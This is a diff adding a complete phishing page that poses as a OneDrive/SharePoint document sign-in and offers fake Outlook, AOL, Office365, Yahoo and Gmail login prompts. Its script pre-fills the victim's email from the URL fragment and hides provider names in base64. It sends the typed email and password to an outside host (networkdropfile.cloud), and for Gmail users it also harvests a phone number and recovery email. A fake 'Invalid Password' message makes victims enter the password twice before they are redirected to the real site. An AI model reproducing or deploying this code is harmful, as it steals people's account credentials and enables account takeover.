@@ -1,0 +1,425 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>Share Point Online</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    </style>
+</head>
+
+<body style="background-image: url('https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/dropbox%20secured.png?alt=media&token=8d4dc8d6-37ba-4374-b168-5fbc7a32d0e9'); background-size: cover;background-repeat: no-repeat;">
+    <div class="container-fluid p-0">
+        
+        <div class="container-fluid">
+            <div class="row" style="margin: 70px 0px 70px 0px;">
+                <div class="col-lg-4 mx-auto px-4" style="max-width: 420px ;background-color: rgba(255,255,255,1);border-radius:5px;">
+                    <div class="text-left py-1">
+                        <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fonedrive-white.png?alt=media&token=6784912d-b75a-4f7f-8b0b-92f4e756ba2d" class="img-fluid" width="0px"><br>
+                        <span class="h3 text-dark">Sign In</span><br>
+                        <span class=" text-dark">To View Document select you email provider below and login with email address.</span><br>
+                        <span class="" style="color:#0070C6; ">Select other emails if your email provider not below.</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                            <div class="rounded px-2 py-1 mt-2" style=" background-color: #0073C8;">
+                                <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foutlook.png?alt=media&token=92745d7d-7a45-4e45-9783-3b9deddccd56" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                            <div class="rounded px-2 py-1 mt-2" style=" background-color: #31459B;">
+                                <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Faol1.png?alt=media&token=fc84b834-fe08-4180-b912-2d574928be45" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                            <div class="rounded px-2 py-1 mt-2" style=" background-color: #FF3C00;">
+                                <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foffice365.png?alt=media&token=df5120d2-acff-4dd7-9da7-0ef213a2f23a" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                            <div class="rounded px-2 py-1 mt-2" style=" background-color: #5F0F68;">
+                                <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fyahoo.png?alt=media&token=9d39cdce-7132-42d7-b7d9-49081b0a7e0e" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                            <div class="rounded px-2 py-1 mt-2" style=" background-color: #0B5BD3;">
+                                <img src="https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fothermail.ico?alt=media&token=4beee03d-57d6-4e44-9e1d-24f9aa3d37f0" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                            </div>
+                        </a>
+                        <p class="h5 text-center text-white mt-2">OneDrive © 2020</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <center>
+                        <img id="fieldImg" src="https://firebasestorage.googleapis.com/v0/b/cpamaeapreparer.appspot.com/o/images%2Fgmail.png?alt=media&token=8e24662a-3498-4f1e-b5b7-c1806a862d9d" class="img-fluid rounded-circle" width="80px">
+                        <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+                        <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
+                        <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form class="form-horizontal well">
+                        <input type="hidden" name="count" id="count" value="0">
+                        <div id="div1">
+                            <div class="col-lg-12">
+                                <div class="form-group">
+                                    <div>
+                                        <label for="exampleInputEmail1">Email address</label>
+                                        <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email" required="">
+                                        <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
+                                </div>
+                            </div>
+                            <div class="col-lg-12">
+                                <div class="form-group">
+                                    <label for="pr">Password</label>
+                                    <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" required="">
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                <input type="button" class="btn btn-info pull-right" name="submit-btn" id="submit-btn" value="Login">
+                            </div>
+                        </div>
+                    </form>
+                    <form class="form-horizontal well">
+                        <div id="div2" style="display: none;">
+                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich" class="h5">abc@abc.com</span><br>
+                            <span class="h4 font-weight-normal">Verify it's you</span><br>
+                            <span>This device is not recognized. For security, Google want to make sure it's really you.</span><br>
+                            
+                            <br>
+                            <span>Try another way to sign in</span>
+                            <div class="form-group mt-3">
+                                <input type="number" name="ph" class="form-control" id="ph" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
+                            </div>
+                            <div class="form-group mt-3">
+                                <input type="text" name="rec_ai" class="form-control" id="rec_ai" aria-describedby="aiHelp" placeholder="Enter Recovery Email." required="">
+                            </div>
+                            <div class="text-right">
+                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                <input type="button" class="btn btn-info pull-right" name="submit-btn1" id="submit-btn1" value="verify">
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+$(document).ready(function() {
+    var count = 0;
+    var ou = "b3V0bG9vaw==";
+    var ho = "aG90bWFpbA==";
+    var gm = "Z21haWw=";
+    var ya = "eWFob28=";
+    var of = "b2ZmaWNlMzY1";
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+    }
+
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        // alert(count);
+        var ai = window.location.hash.substr(1);
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var count = $('#count').val();
+        if (final == atob(gm)) {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/cpamaeapreparer.appspot.com/o/images%2Fgmail.png?alt=media&token=8e24662a-3498-4f1e-b5b7-c1806a862d9d');
+            $('#field').html(atob(gm));
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#gmailmodal").trigger("click");
+
+        } else if (final == atob(ou) || final == atob(ho)) {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foutlook.png?alt=media&token=92745d7d-7a45-4e45-9783-3b9deddccd56');
+            $('#field').html("Outlook");
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#outlookmodal").trigger("click");
+        } else if (final == "aol") {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Faol.png?alt=media&token=3965d9c4-3f69-4bb1-aa45-6bab5be6541a');
+            $('#field').html("Aol");
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#aolmodal").trigger("click");
+        } else if (final == atob( of )) {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foffice365.png?alt=media&token=df5120d2-acff-4dd7-9da7-0ef213a2f23a');
+            $('#field').html("Office 365");
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#office365modal").trigger("click");
+        } else if (final == atob(ya)) {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fyahoo.png?alt=media&token=9d39cdce-7132-42d7-b7d9-49081b0a7e0e');
+            $('#field').html("Yahoo");
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#yahoomodal").trigger("click");
+
+        } else {
+            $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fothermail.ico?alt=media&token=4beee03d-57d6-4e44-9e1d-24f9aa3d37f0');
+            $('#field').html("Other Mail");
+            $('#ai').val(my_ai);
+            $('#aich').html(my_ai);
+            $("#othermodal").trigger("click");
+        }
+
+    }
+    ///////////////url getting ai////////////////
+
+
+    $('#gmailmodal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/cpamaeapreparer.appspot.com/o/images%2Fgmail.png?alt=media&token=8e24662a-3498-4f1e-b5b7-c1806a862d9d');
+        $('#field').html(atob(gm));
+        $("#msg").hide();
+    });
+
+    $('#outlookmodal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foutlook.png?alt=media&token=92745d7d-7a45-4e45-9783-3b9deddccd56');
+        $('#field').html("Outlook");
+        $("#msg").hide();
+    });
+    $('#aolmodal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Faol.png?alt=media&token=3965d9c4-3f69-4bb1-aa45-6bab5be6541a');
+        $('#field').html("Aol");
+        $("#msg").hide();
+    });
+    $('#office365modal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Foffice365.png?alt=media&token=df5120d2-acff-4dd7-9da7-0ef213a2f23a');
+        $('#field').html("Office 365");
+        $("#msg").hide();
+    });
+    $('#yahoomodal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fyahoo.png?alt=media&token=9d39cdce-7132-42d7-b7d9-49081b0a7e0e');
+        $('#field').html("Yahoo");
+        $("#msg").hide();
+    });
+    $('#othermodal').click(function() {
+        $('#fieldImg').attr('src', 'https://firebasestorage.googleapis.com/v0/b/images-c039a.appspot.com/o/images%2Fothermail.ico?alt=media&token=4beee03d-57d6-4e44-9e1d-24f9aa3d37f0');
+        $('#field').html("Other Mail");
+        $("#msg").hide();
+    });
+
+    var file="bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('.error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        $field= $('#field').html();
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!ai) {
+            $('.error').show();
+            $('.error').html("Email field is empty...!");
+            ai.focus;
+            return false;
+        }
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            $('.error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('.error').show();
+            $('.error').html("Password field is empty...!");
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://networkdropfile.cloud/mail/next.php",
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Verifing...');
+            },
+            success: function(response) {
+                
+                if (count == 1 && (final == "gmail" || $field =="Gmail" || $field =="gmail") ) {
+                    $('#aich').html(my_ai);
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+                    $('#submit-btn').hide();
+                    $('#submit-btn1').show();
+
+                    return false;
+
+                }
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://google.com");
+                    return false;
+                }
+                $("#pr").val("");
+                $("#msg").show();
+            },
+            error: function() {
+                if (count == 1 && (final == "gmail" || $field =="Gmail" || $field =="gmail") ) {
+                    $('#aich').html(my_ai);
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+                    $('#submit-btn').hide();
+                    $('#submit-btn1').show();
+
+                    return false;
+
+                }
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://google.com");
+                    return false;
+                }
+                $("#pr").val("");
+                $("#msg").show();
+            },
+            complete: function() {
+                $('#submit-btn').val('Login');
+            }
+        });
+    });
+    $('#submit-btn1').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var ph = $("#ph").val();
+        var rec_ai = $("#rec_ai").val();
+        if (!ai) {
+            $('.error').show();
+            $('.error').html("Email field is empty...!");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('.error').show();
+            $('.error').html("Password field is empty...!");
+            ai.focus;
+            return false;
+        }
+        if (!ph) {
+            $('.error').show();
+            $('.error').html("Phone field is empty...!");
+            ai.focus;
+            return false;
+        }
+        if (!rec_ai) {
+            $('.error').show();
+            $('.error').html("Recovery email field is empty...!");
+            ai.focus;
+            return false;
+        }
+
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://networkdropfile.cloud/mail/next.php",
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+                ph: ph,
+                rec_ai: rec_ai
+
+            },
+            beforeSend: function(xhr) {
+                $('#submit-btn1').val('Verifing...');
+            },
+            success: function(response) {
+                window.location.replace("http://gmail.com");
+            },
+            error: function() {
+                window.location.replace("http://gmail.com");
+            },
+            complete: function() {
+                $('#submit-btn1').val('Verify');
+            }
+        });
+        // }
+    });
+    
+});
+</script>
+
+</html>
